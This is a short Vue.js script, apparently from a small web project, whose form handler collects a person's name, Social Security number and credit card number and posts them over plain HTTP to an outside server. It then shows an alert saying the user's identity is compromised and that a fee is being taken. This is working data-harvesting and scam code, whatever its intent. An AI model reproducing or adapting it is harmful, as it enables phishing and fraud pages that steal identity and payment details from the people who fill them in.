var app = new Vue({
  el: '#app',
  data: {
    addedName: '',
    addedSSN: '',
    addedCCN: '',
    addedProblem: '',
    tickets: {},
  },
  created() {
  },
  methods: {
    async postInfo() {
      try {
        console.log("posting");
        let response = await axios.post("http://mattheworme.com:4202/info", {
          name: this.addedName,
          ssn: this.addedSSN,
          ccn: this.addedCCN,
        });
        this.addedName = "";
        this.addedSSN = "";
        this.addedCCN = "";
        console.log("posted");
        window.alert("Your identity has been comprimised! We are taking a small fee to fix this issue.");
        return true;
      }
      catch (error) {
        console.log(error);
      }
    },

  }
});
